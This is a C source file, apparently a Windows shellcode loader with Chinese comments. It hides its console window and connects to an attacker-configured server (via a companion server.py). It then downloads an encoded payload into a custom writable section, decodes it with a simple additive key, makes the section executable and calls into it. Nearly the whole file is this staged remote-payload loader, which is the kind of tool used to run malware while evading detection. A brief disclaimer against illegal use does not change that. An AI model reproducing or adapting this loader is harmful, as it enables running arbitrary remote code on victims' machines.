/*
auth : Ga
此脚本禁止非法用途
*/
#include <stdio.h>
#include <windows.h>
#pragma comment (lib, "ws2_32.lib")  //加载 ws2_32.dll
#define BUF_SIZE 1024

#pragma data_seg(".Mydata")
char load[256] = { 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00 };
#pragma data_seg() 
#pragma   comment(linker,"/SECTION:.Mydata,RW") 

//这里填写server.py脚本运行的地址
const char* ip = "127.0.0.1";
//这里填写server.py脚本的key
const int key_server = 1;

IMAGE_DOS_HEADER* GetDosHeader(void* address) {
	return (IMAGE_DOS_HEADER*)address;
}
IMAGE_NT_HEADERS* GetNtHeader(void* address) {
	return (IMAGE_NT_HEADERS*)(GetDosHeader(address)->e_lfanew + (SIZE_T)address);
}
IMAGE_FILE_HEADER GetFileHeader(void* address) {
	return (IMAGE_FILE_HEADER)(GetNtHeader(address)->FileHeader);
}

BYTE Decrpy(BYTE var1,int var2) {
	BYTE code = var1 % 256;
	BYTE key = var2 % 256;
	BYTE shellcode = code - key;
	if (shellcode < 0) {
		shellcode = shellcode + 256;
	}
	return shellcode;
}



void Decrpyall() {
	int jiami = 1;
	for (int key = 1; key <= BUF_SIZE; key++) {
		load[key - 1] = Decrpy(load[key - 1], jiami);
		jiami = jiami + key_server;
	}
}

int main(void) {
	HWND hwnd = GetForegroundWindow();	
	if (hwnd) {
		ShowWindow(hwnd, SW_HIDE);				
	}


	printf("success");
	//初始化DLL
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);

	//创建套接字
	SOCKET sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);


	sockaddr_in sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));  
	sockAddr.sin_family = PF_INET;
	sockAddr.sin_addr.s_addr = inet_addr(ip);
	sockAddr.sin_port = htons(12345);
	connect(sock, (SOCKADDR*)&sockAddr, sizeof(SOCKADDR));

	const char* bufSend = "4057";
	printf("连接成功\n");
	send(sock, bufSend, strlen(bufSend), 0);

	recv(sock, load, BUF_SIZE, 0);

	closesocket(sock);


	WSACleanup();

	printf("connect");
	Decrpyall();

	HMODULE address_proc = GetModuleHandle(NULL);

	DWORD number_section = GetFileHeader(address_proc).NumberOfSections;
	//获取节表数组
	//Sleep(12);
	PIMAGE_SECTION_HEADER list_section = IMAGE_FIRST_SECTION(GetNtHeader(address_proc));
	DWORD address_real = NULL;
	DWORD test = 0;
	for (test; test < number_section; test++) {
		DWORD test_bool = lstrcmpA((LPCSTR)list_section[test].Name, (LPCSTR)".Mydata");
		if (!test_bool){
			address_real = (DWORD)list_section[test].VirtualAddress + (DWORD)address_proc;
			break;
		}
	}
	DWORD result_1 = 1;
	HMODULE add = (HMODULE)address_real;
	
	if (VirtualProtect((PVOID)add, 607, PAGE_EXECUTE_READ, &result_1)) {
		//改rx

	}
	else {
		GetLastError();
	};
	//跳转
	
	try {
		__asm {
			call add;
			//mov jj, eax;
		}
	}
	catch(int b) {

	}
	

	int a = 0;

	return 0;

}